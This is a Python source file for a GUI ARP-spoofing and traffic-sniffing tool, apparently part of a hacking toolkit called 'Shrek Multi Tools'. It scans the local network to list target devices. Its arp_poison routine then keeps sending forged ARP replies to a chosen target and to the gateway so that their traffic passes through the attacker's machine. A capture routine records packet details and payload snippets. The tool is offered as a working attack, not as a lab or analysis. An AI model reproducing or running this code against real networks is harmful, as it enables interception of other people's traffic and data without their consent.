# Shrek was proudly coded by Shrek™ [https://github.com/SHREK-TM].
# Copyright © Shrek Multi Tools

import customtkinter as ctk
import tkinter.messagebox
import threading
import time
import socket
import sys
import os
import re
import queue
import platform
import subprocess
import ipaddress
import concurrent.futures
import hashlib
from time import sleep
from datetime import datetime, UTC
from datetime import datetime
from scapy.all import get_if_hwaddr, get_if_addr, ARP, Ether, sendp, sniff, conf, srp
import psutil
from colorama import Fore, Style, init

try:
    import requests
except ImportError:
    requests = None

root_path = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..")
)
if root_path not in sys.path:
    sys.path.insert(0, root_path)

from utilities.core.context import return_to_menu
from utilities.core.shrek_ui import set_console_title

init(autoreset=True)

# ---- Style Functions ----
def success(text):
    print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def info(text):
    print(f'{Fore.YELLOW}[{Fore.WHITE}*{Fore.YELLOW}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def warn(text):
    print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}] {Fore.WHITE}{text}{Style.RESET_ALL}')

def input_prompt(prompt):
    return input(f'    {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE} {prompt}: {Style.RESET_ALL}')

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ---- GUI Theme ----
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

COLORS = {
    "bg": "#0a0a0a",
    "frame": "#111111",
    "frame_light": "#1a1a1a",
    "green_dark": "#00aa00",
    "green_bright": "#00ff00",
    "green_hover": "#00cc00",
    "red": "#cc0000",
    "red_hover": "#aa0000",
    "text": "#00ff00",
    "text_secondary": "#33ff33",
    "border": "#00ff00",
    "white": "#ffffff"
}

FONT         = ('Consolas', 15, 'bold')
FONT_TITLE   = ('Consolas', 23, 'bold')

def get_available_interfaces():
    return [iface for iface in psutil.net_if_addrs().keys() if not iface.lower().startswith('loopback')]

def get_default_interface():
    try:
        stats = psutil.net_if_stats()
    except Exception:
        pass
    interfaces = get_available_interfaces()
    return interfaces[0] if interfaces else ''

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = None
    finally:
        s.close()
    return ip

def guess_net(ip, prefix=24):
    return str(ipaddress.ip_network(f'{ip}/{prefix}', strict=False))

def arp_scan_scapy(cidr):
    try:
        conf.verb = 0
        arp = ARP(pdst=cidr)
        ether = Ether(dst='ff:ff:ff:ff:ff:ff')
        packet = ether / arp
        answered, _ = srp(packet, timeout=2, retry=1, iface=conf.iface)
        results = []
        for _, r in answered:
            results.append({'ip': r.psrc, 'mac': r.hwsrc.lower()})
        return results
    except Exception as e:
        raise RuntimeError('Scapy ARP scan failed') from e

def ping_once(ip):
    system = platform.system().lower()
    if system == 'windows':
        cmd = ['ping', '-n', '1', '-w', '1000', ip]
    else:
        cmd = ['ping', '-c', '1', '-W', '1', ip]
    try:
        subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        return False
    except Exception:
        return False
    return True

def parse_arp_table():
    system = platform.system().lower()
    entries = []
    try:
        if system == 'windows':
            out = subprocess.check_output(['arp', '-a'], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                match = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f-]{17})', line, re.I)
                if match:
                    entries.append({'ip': match.group(1), 'mac': match.group(2)})
        else:
            out = subprocess.check_output(['arp', '-n'], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                match = re.search(r'(\d+\.\d+\.\d+\.\d+).+?((?:[0-9a-f]{2}:){5}[0-9a-f]{2})', line, re.I)
                if match:
                    entries.append({'ip': match.group(1), 'mac': match.group(2)})
    except Exception:
        pass
    return entries

def sweep_network_ping(cidr, max_workers=200):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
        if len(hosts) > 1024:
            hosts = hosts[:1024]
        alive = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(max_workers, 500)) as ex:
            futures = {ex.submit(ping_once, ip): ip for ip in hosts}
            for fut in concurrent.futures.as_completed(futures):
                try:
                    ip = futures[fut]
                    if fut.result():
                        alive.append(ip)
                except Exception:
                    continue
        arp_entries = parse_arp_table()
        arp_map = {e['ip']: e['mac'] for e in arp_entries}
        return [{'ip': ip, 'mac': arp_map.get(ip)} for ip in alive]
    except Exception:
        return []

def reverse_dns(ip, timeout=1.5):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ex:
            fut = ex.submit(socket.gethostbyaddr, ip)
            try:
                name = fut.result(timeout=timeout)[0]
                return name
            except concurrent.futures.TimeoutError:
                return None
            except Exception:
                return None
    except Exception:
        return None

def netbios_name_lookup(ip):
    try:
        system = platform.system().lower()
        if system == 'windows':
            try:
                out = subprocess.check_output(['nbtstat', '-A', ip], text=True, stderr=subprocess.DEVNULL)
                m = re.search(r'<20>\s+UNIQUE\s+<(.+?)>', out)
                if m:
                    return m.group(1)
                m2 = re.search(r'^\s*(\S+)\s+<00>\s+UNIQUE', out, re.M)
                if m2:
                    return m2.group(1)
                return None
            except Exception:
                return None
        else:
            try:
                out = subprocess.check_output(['nmblookup', '-A', ip], text=True, stderr=subprocess.DEVNULL)
                for line in out.splitlines():
                    line = line.strip()
                    m = re.match(r'^(\S+)\s+<\w+>\s+(\w+)', line)
                    if m:
                        return m.group(1)
            except Exception:
                pass
            try:
                out2 = subprocess.check_output(['avahi-resolve-address', ip], text=True, stderr=subprocess.DEVNULL)
                parts = out2.split()
                if len(parts) >= 2:
                    return parts[1]
                return None
            except Exception:
                return None
    except Exception:
        return None

def get_vendor_from_mac_api(mac):
    try:
        if not mac or not requests:
            return None
        mac_clean = mac.strip().upper()
        url = f'https://api.macvendors.com/{mac_clean}'
        r = requests.get(url, timeout=3)
        if r.status_code == 200 and r.text:
            return r.text.strip()
        return None
    except Exception:
        return None

def enrich_entry(entry):
    ip = entry.get('ip')
    mac = entry.get('mac')
    res = {'ip': ip, 'mac': mac, 'hostname': None, 'netbios': None, 'vendor': None}
    res['hostname'] = reverse_dns(ip)
    res['netbios'] = netbios_name_lookup(ip)
    res['vendor'] = get_vendor_from_mac_api(mac) if mac else None
    return res

class MITMInterface(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.configure(fg_color=COLORS["bg"])
        self.title('ARP Spoof | Shrek Multi Tools')
        
        # ---- Chemin de l'icône corrigé ----
        icon_path = os.path.join(root_path, 'utilities', 'tools', 'input', 'shrek.ico')
        if os.path.exists(icon_path):
            try:
                self.iconbitmap(icon_path)
            except Exception as e:
                print(f'[-] Icon error: {e}')
        
        self.geometry('1400x900')
        self.minsize(1100, 700)
        self.protocol('WM_DELETE_WINDOW', self.quit)
        
        self.stop_event = threading.Event()
        self.log_queue = queue.Queue()
        self.packet_queue = queue.Queue()
        self.lock = threading.Lock()
        
        self.interfaces = get_available_interfaces()
        default_iface = get_default_interface()
        self.config = {
            'target_ip': '',
            'gateway_ip': '',
            'target_mac': '',
            'gateway_mac': '',
            'iface': default_iface if default_iface in self.interfaces else self.interfaces[0] if self.interfaces else '',
            'protocols': ['HTTP', 'TCP', 'UDP', 'OTHER'],
            'sniff_all': False
        }
        self.local_mac = None
        self.local_ip = None
        self.attack_thread = None
        self.capture_thread = None
        
        self.grid_rowconfigure(0, weight=22)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=3)
        self.grid_columnconfigure(1, weight=4)
        self.grid_columnconfigure(2, weight=2)
        
        self.setup_ui()
        self.after(150, self.log_worker)
        self.after(300, self.flush_packets)
        self.detect_network()

    def detect_gateway(self):
        gw_ip = None
        try:
            if platform.system() == 'Windows':
                routes = subprocess.check_output('route print', shell=True).decode('mbcs', errors='ignore')
                for line in routes.splitlines():
                    m = re.match(r'\s*0\.0\.0\.0\s+0\.0\.0\.0\s+([0-9]{1,3}(?:\.[0-9]{1,3}){3})\s', line)
                    if m:
                        gw_ip = m.group(1)
                        return gw_ip
            else:
                result = subprocess.check_output(['ip', 'route']).decode()
                m = re.search(r'default via ([0-9]{1,3}(?:\.[0-9]{1,3}){3})', result)
                if m:
                    gw_ip = m.group(1)
                    return gw_ip
        except Exception:
            pass
        return gw_ip

    def find_mac_for_ip(self, ip):
        try:
            if platform.system() == 'Windows':
                result = subprocess.check_output('arp -a', shell=True).decode('mbcs', errors='ignore')
            else:
                result = subprocess.check_output(['arp', '-n']).decode()
            
            for line in result.splitlines():
                if ip in line:
                    mac = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if mac:
                        return mac.group(0).replace('-', ':')
        except Exception:
            return ''
        return ''

    def detect_network(self):
        try:
            self.config['iface'] = self.iface_var.get()
            self.local_ip = get_if_addr(self.config['iface'])
            self.local_mac = get_if_hwaddr(self.config['iface'])
            self.log(f'[AUTO] Interface used: {self.config["iface"]}')
            self.log(f'[AUTO] Local IP: {self.local_ip}')
            self.log(f'[AUTO] Local MAC: {self.local_mac}')
            
            gw_ip = self.detect_gateway()
            if gw_ip:
                self.config['gateway_ip'] = gw_ip
                self.gateway_ip_entry.delete(0, 'end')
                self.gateway_ip_entry.insert(0, gw_ip)
                self.log(f'[AUTO] Gateway IP: {gw_ip}')
                
                gw_mac = self.find_mac_for_ip(gw_ip)
                if gw_mac:
                    self.config['gateway_mac'] = gw_mac
                    self.gateway_mac_entry.delete(0, 'end')
                    self.gateway_mac_entry.insert(0, gw_mac)
                    self.log(f'[AUTO] Gateway MAC: {gw_mac}')
                else:
                    self.log('[AUTO] Could not find gateway MAC')
            else:
                self.log('[AUTO] Could not find gateway IP via routing')
            
            self.scan_ip_targets()
        except Exception as e:
            self.log(f'[ERROR] Network detection: {e}')

    def scan_ip_targets(self):
        try:
            local_ip = get_local_ip()
            if not local_ip:
                self.log('[ERROR] Could not determine local IP')
                return
            
            cidr = guess_net(local_ip, prefix=24)
            self.log(f'[AUTO] Scanning network: {cidr}')
            results = []
            
            try:
                results = arp_scan_scapy(cidr)
                self.log(f'[AUTO] ARP scan (scapy): {len(results)} hosts found')
            except Exception:
                self.log('[AUTO] Scapy unavailable or not root, falling back to ping sweep')
                results = sweep_network_ping(cidr)
                self.log(f'[AUTO] Ping sweep: {len(results)} responsive hosts found')
            
            enriched = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
                futures = [ex.submit(enrich_entry, r) for r in results]
                for fut in concurrent.futures.as_completed(futures):
                    try:
                        enriched.append(fut.result())
                    except Exception:
                        pass
            
            enriched_sorted = sorted(enriched, key=lambda x: x.get('ip') or '')
            
            if enriched_sorted:
                self.log('[AUTO] TARGET IPs and MACs:')
                self.log(f'{"IP":16} {"MAC":18} {"Hostname":30} {"NetBIOS/mDNS":20} {"Vendor"}')
                for e in enriched_sorted:
                    ip = e.get('ip') or '-'
                    mac = e.get('mac') or '-'
                    hn = e.get('hostname') or '-'
                    nb = e.get('netbios') or '-'
                    vendor = e.get('vendor') or '-'
                    if ip != self.config.get('gateway_ip', ''):
                        self.log(f'{ip:16} {mac:18} {hn:30} {nb:20} {vendor}')
            else:
                self.log('[AUTO] No target devices detected on the network')
        except Exception as e:
            self.log(f'[ERROR] Target IP scan: {e}')

    def validate_ip(self, ip):
        return re.match(r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', ip) and all(0 <= int(x) <= 255 for x in ip.split('.'))

    def validate_mac(self, mac):
        return re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac)

    def setup_ui(self):
        left = ctk.CTkFrame(self, fg_color=COLORS["bg"])
        left.grid(row=0, column=0, sticky='nsew', padx=6, pady=(6, 2))
        ctk.CTkLabel(left, text='[ OPERATIONAL LOGS ]', font=FONT_TITLE, text_color=COLORS["green_bright"]).pack(pady=(11, 8))
        self.log_text = ctk.CTkTextbox(left, fg_color=COLORS["bg"], text_color=COLORS["text"], font=FONT, wrap='word', border_color=COLORS["border"], border_width=1)
        self.log_text.pack(fill='both', expand=True)

        center = ctk.CTkFrame(self, fg_color=COLORS["bg"])
        center.grid(row=0, column=1, sticky='nsew', padx=6, pady=(6, 2))
        ctk.CTkLabel(center, text='[ CAPTURED PACKETS ]', font=FONT_TITLE, text_color=COLORS["green_bright"]).pack(pady=(11, 8))
        self.packet_tree = ctk.CTkTextbox(center, fg_color=COLORS["bg"], text_color=COLORS["text"], font=FONT, wrap='none', height=33, border_color=COLORS["border"], border_width=1)
        self.packet_tree.pack(fill='both', expand=True)

        right = ctk.CTkFrame(self, fg_color=COLORS["bg"])
        right.grid(row=0, column=2, sticky='nsew', padx=6, pady=(6, 2))
        ctk.CTkLabel(right, text='[ CONFIGURATION ]', font=FONT_TITLE, text_color=COLORS["green_bright"]).pack(pady=(11, 8))
        
        config_frame = ctk.CTkFrame(right, fg_color=COLORS["bg"])
        config_frame.pack(fill='both', expand=True)

        labels = ['Target IP:', 'Gateway IP:', 'Target MAC:', 'Gateway MAC:', 'Protocols:']
        entries = []
        
        for label in labels:
            row = ctk.CTkFrame(config_frame, fg_color=COLORS["bg"])
            row.pack(fill='x', pady=10)
            ctk.CTkLabel(row, text=label, font=FONT, text_color=COLORS["text"], width=170, anchor='w').pack(side='left')
            entry = ctk.CTkEntry(row, font=FONT, width=260, fg_color=COLORS["bg"], border_color=COLORS["border"], text_color=COLORS["text"])
            entry.pack(side='left', padx=16)
            entries.append(entry)
        
        self.target_ip_entry, self.gateway_ip_entry, self.target_mac_entry, self.gateway_mac_entry, self.proto_entry = entries

        row_iface = ctk.CTkFrame(config_frame, fg_color=COLORS["bg"])
        row_iface.pack(fill='x', pady=10)
        ctk.CTkLabel(row_iface, text='Interface:', font=FONT, text_color=COLORS["text"], width=170, anchor='w').pack(side='left')
        self.iface_var = ctk.StringVar(value=self.config['iface'])
        self.iface_menu = ctk.CTkOptionMenu(
            row_iface,
            variable=self.iface_var,
            values=self.interfaces,
            font=FONT,
            width=260,
            fg_color=COLORS["bg"],
            text_color=COLORS["text"],
            button_color=COLORS["green_dark"],
            button_hover_color=COLORS["green_hover"]
        )
        self.iface_menu.pack(side='left', padx=16)

        self.sniff_all_var = ctk.BooleanVar(value=False)
        self.sniff_all_check = ctk.CTkCheckBox(
            config_frame,
            text='Sniff entire network',
            variable=self.sniff_all_var,
            font=FONT,
            text_color=COLORS["text"],
            fg_color=COLORS["green_dark"],
            hover_color=COLORS["green_hover"],
            border_color=COLORS["green_dark"],
            border_width=2
        )
        self.sniff_all_check.pack(pady=10)
        
        self.proto_entry.insert(0, 'HTTP,TCP,UDP,OTHER')

        bottom = ctk.CTkFrame(self, fg_color=COLORS["bg"], height=80)
        bottom.grid(row=1, column=0, columnspan=3, sticky='ew', padx=6, pady=(3, 10))
        
        btn_frame = ctk.CTkFrame(bottom, fg_color=COLORS["bg"])
        btn_frame.pack(expand=True)

        self.start_btn = ctk.CTkButton(
            btn_frame,
            text='▶ START',
            command=self.start_attack,
            font=FONT,
            fg_color=COLORS["green_dark"],
            hover_color=COLORS["green_hover"],
            text_color=COLORS["white"],
            border_color=COLORS["border"],
            border_width=1,
            width=180,
            height=50
        )
        self.start_btn.pack(side='left', padx=18)

        self.stop_btn = ctk.CTkButton(
            btn_frame,
            text='■ STOP',
            command=self.stop_attack,
            state='disabled',
            font=FONT,
            fg_color=COLORS["red"],
            hover_color=COLORS["red_hover"],
            text_color=COLORS["white"],
            text_color_disabled='#888888',
            border_color=COLORS["red"],
            border_width=1,
            width=180,
            height=50
        )
        self.stop_btn.pack(side='left', padx=18)

        ctk.CTkButton(
            btn_frame,
            text='💾 SAVE',
            command=self.save_config,
            font=FONT,
            fg_color=COLORS["green_dark"],
            hover_color=COLORS["green_hover"],
            text_color=COLORS["white"],
            border_color=COLORS["border"],
            border_width=1,
            width=180,
            height=50
        ).pack(side='left', padx=18)

        ctk.CTkButton(
            btn_frame,
            text='✕ QUIT',
            command=self.quit,
            font=FONT,
            fg_color=COLORS["red"],
            hover_color=COLORS["red_hover"],
            text_color=COLORS["white"],
            border_color=COLORS["red"],
            border_width=1,
            width=180,
            height=50
        ).pack(side='right', padx=18)

        self.status_var = ctk.StringVar(value='READY')
        ctk.CTkLabel(bottom, textvariable=self.status_var, text_color=COLORS["green_bright"], font=FONT_TITLE, anchor='w').pack(side='left', padx=24)

    def log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_queue.put(f'[{timestamp}] {msg}')

    def log_worker(self):
        try:
            msg = self.log_queue.get_nowait()
            self.log_text.insert('end', msg + '\n')
            self.log_text.see('end')
            lines = int(self.log_text.index('end-1c').split('.')[0])
            if lines > 200:
                self.log_text.delete('1.0', '50.0')
        except queue.Empty:
            pass
        self.after(150, self.log_worker)

    def save_config(self):
        try:
            self.config['target_ip'] = self.target_ip_entry.get().strip()
            self.config['gateway_ip'] = self.gateway_ip_entry.get().strip()
            self.config['target_mac'] = self.target_mac_entry.get().strip().upper().replace('-', ':')
            self.config['gateway_mac'] = self.gateway_mac_entry.get().strip().upper().replace('-', ':')
            self.config['iface'] = self.iface_var.get()
            self.config['sniff_all'] = self.sniff_all_var.get()
            
            proto_input = [p.strip().upper() for p in self.proto_entry.get().split(',')]
            self.config['protocols'] = [p for p in proto_input if p in ['HTTP', 'TCP', 'UDP', 'OTHER']] or ['HTTP', 'TCP', 'UDP', 'OTHER']
            
            self.log(f'[CONFIG] Target IP: {self.config["target_ip"]}')
            self.log(f'[CONFIG] Target MAC: {self.config["target_mac"]}')
            self.log(f'[CONFIG] Gateway IP: {self.config["gateway_ip"]}')
            self.log(f'[CONFIG] Gateway MAC: {self.config["gateway_mac"]}')
            self.log(f'[CONFIG] Interface: {self.config["iface"]}')
            self.log(f'[CONFIG] Full Sniff Mode: {"Enabled" if self.config["sniff_all"] else "Disabled"}')
            
            if not self.config['sniff_all']:
                if not self.validate_ip(self.config['target_ip']):
                    raise ValueError('Invalid target IP')
                if not self.validate_ip(self.config['gateway_ip']):
                    raise ValueError('Invalid gateway IP')
                if not self.validate_mac(self.config['target_mac']):
                    raise ValueError('Invalid target MAC')
                if not self.validate_mac(self.config['gateway_mac']):
                    raise ValueError('Invalid gateway MAC')
            
            self.log('[CONFIG] Parameters validated and saved')
        except Exception as e:
            self.log(f'[ERROR] Config: {e}')

    def start_attack(self):
        if self.attack_thread and self.attack_thread.is_alive():
            return
        
        self.save_config()
        self.log(f'[START] Full Sniff Mode: {"Enabled" if self.config["sniff_all"] else "Disabled"}')
        
        if not self.config['sniff_all']:
            self.log(f'[START] Target IP: {self.config["target_ip"]}')
            self.log(f'[START] Target MAC: {self.config["target_mac"]}')
            self.log(f'[START] Gateway IP: {self.config["gateway_ip"]}')
            self.log(f'[START] Gateway MAC: {self.config["gateway_mac"]}')
            
            if not all([self.config['target_ip'], self.config['gateway_ip'], self.config['target_mac'], self.config['gateway_mac']]):
                self.log('[ERROR] Incomplete configuration')
                return
        
        self.log(f'[START] Interface: {self.config["iface"]}')
        self.stop_event.clear()
        self.start_btn.configure(state='disabled')
        self.stop_btn.configure(state='normal')
        self.status_var.set('ATTACK IN PROGRESS')
        
        if not self.config['sniff_all']:
            self.attack_thread = threading.Thread(target=self.arp_poison, daemon=True)
            self.attack_thread.start()
        
        self.capture_thread = threading.Thread(target=self.real_capture, daemon=True)
        self.capture_thread.start()
        self.log('[ATTACK] Capture started' + (' with ARP Spoofing' if not self.config['sniff_all'] else ''))

    def stop_attack(self):
        self.stop_event.set()
        self.start_btn.configure(state='normal')
        self.stop_btn.configure(state='disabled')
        self.status_var.set('STOPPED')
        self.log('[ATTACK] Stopped')

    def quit(self):
        self.stop_event.set()
        self.destroy()

    def arp_poison(self):
        try:
            target = ARP(op=2, pdst=self.config['target_ip'], hwdst=self.config['target_mac'], psrc=self.config['gateway_ip'])
            gateway = ARP(op=2, pdst=self.config['gateway_ip'], hwdst=self.config['gateway_mac'], psrc=self.config['target_ip'])
            
            while not self.stop_event.is_set():
                sendp(Ether() / target, iface=self.config['iface'], verbose=False)
                sendp(Ether() / gateway, iface=self.config['iface'], verbose=False)
                self.log(f'[SPOOF] → Target IP: {self.config["target_ip"]}')
                self.log(f'[SPOOF] → Target MAC: {self.config["target_mac"]}')
                
                for _ in range(10):
                    if self.stop_event.is_set():
                        break
                    time.sleep(0.1)
        except Exception as e:
            self.log(f'[ERROR SPOOF] {e}')

    def real_capture(self):
        def packet_handler(pkt):
            if self.stop_event.is_set():
                return
            
            if pkt.haslayer('IP'):
                src = pkt['IP'].src
                dst = pkt['IP'].dst
                proto = pkt['IP'].proto
                proto_str = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}.get(proto, 'OTHER')
                
                if proto_str not in self.config['protocols']:
                    return
                
                if not self.config['sniff_all'] and src != self.config['target_ip'] and dst != self.config['target_ip']:
                    return
                
                info = ''
                data = ''
                
                if pkt.haslayer('TCP'):
                    info = f'Port {pkt["TCP"].dport}'
                    if pkt.haslayer('Raw'):
                        payload = pkt['Raw'].load[:50]
                        try:
                            data = payload.decode(errors='ignore')
                            if data and 'HTTP' in (data.split()[0] if data else ''):
                                proto_str = 'HTTP'
                        except:
                            data = str(payload)
                elif pkt.haslayer('UDP'):
                    info = f'Port {pkt["UDP"].dport}'
                
                with self.lock:
                    self.packet_queue.put({
                        'ts': datetime.now().strftime('%H:%M:%S.%f')[:-3],
                        'src': src,
                        'dst': dst,
                        'proto': proto_str,
                        'info': info[:30],
                        'data': data[:40] if data else 'N/A'
                    })
        
        try:
            sniff(iface=self.config['iface'], prn=packet_handler, store=False, stop_filter=lambda x: self.stop_event.is_set())
        except Exception as e:
            self.log(f'[ERROR CAPTURE] {e}')

    def flush_packets(self):
        items = []
        with self.lock:
            try:
                while True:
                    pkt = self.packet_queue.get_nowait()
                    items.append(pkt)
            except queue.Empty:
                pass
        
        if items:
            for pkt in items:
                line = f'{pkt["ts"]}  {pkt["src"]}  {pkt["dst"]}  {pkt["proto"]}  {pkt["info"]}  {pkt["data"]}\n'
                self.packet_tree.insert('end', line)
                self.packet_tree.see('end')
            
            lines = int(self.packet_tree.index('end-1c').split('.')[0])
            if lines > 300:
                self.packet_tree.delete('1.0', '101.0')
        
        self.after(300, self.flush_packets)

def run():
    set_console_title('ARP Spoofing | Shrek Multi Tools')
    clear_screen()
    
    if platform.system() != 'Windows' and hasattr(os, 'geteuid') and os.geteuid() != 0:
        tkinter.messagebox.showerror('Permission', 'Run as root/admin for real capture')
    else:
        app = MITMInterface()
        app.mainloop()

if __name__ == '__main__':
    run()